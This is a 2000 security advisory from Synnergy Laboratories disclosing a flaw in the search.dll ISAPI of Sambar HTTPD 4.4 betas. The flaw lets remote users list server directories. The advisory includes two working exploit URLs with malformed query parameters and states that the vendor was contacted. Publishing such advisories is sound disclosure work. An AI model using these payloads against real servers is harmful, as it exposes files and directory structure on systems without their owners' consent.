        Synnergy Laboratories Advisory SLA-2000-9

NAME

       Sambar HTTPD ISAPI 4.4 b3 & b4 search vulnerability


AFFECTED
 
  Windows
	Win95
	WinNT
	OSR2

 Linux (possibily)


SYNOPSIS

  Synnergy Labs has found a bug in Sambar's dynamic link loader which does not check
  malformed query parameters, allowing a remote user to view arbitrary contents
  on the server running this httpd. 


DESCRIPTION

  The Sambar Server, www.sambar.com, comes with a non-caching HTTP proxy server and 
  basic SMTP, POP3, and IMAP4 proxy servers compiled in.
  Sambar was created to test a three-tier communication infrastructure modeled 
  after the Sybase Open Client/Open Server. Originally developed on a Sun 
  Workstation (UNIX), it was ported to the PC (Windows 32) and licensed for 
  commercial purposes.

  The vulnerability occurs in the search.dll Sambar ISAPI Search shipped with 
  this product. This dynamic link loader does not check on the 'query' parameter
  that is parsed to the server, therefore by constructing a malformed URL
  we are able to view the contents of the server, all folders, and files.

  Thanks also to USSR Labs (www.ussrback.com) for further testing.


EXPLOIT


  All that is needed is a malformed query parameter parsed to the search.dll file.

  http://server-running-sambar.com/search.dll?search?query=%00&logic=AND

  .. this will reveal the current working directory contents.


  http://server-running-sambar.com/search.dll?search?query=/&logic=AND

  .. this will reveal the root dir of the server.


 

SOLUTION

  The vendor [ tod@sambar.com ] of Sambar Technologies has been contacted, 
  so wait until a patched version comes out.
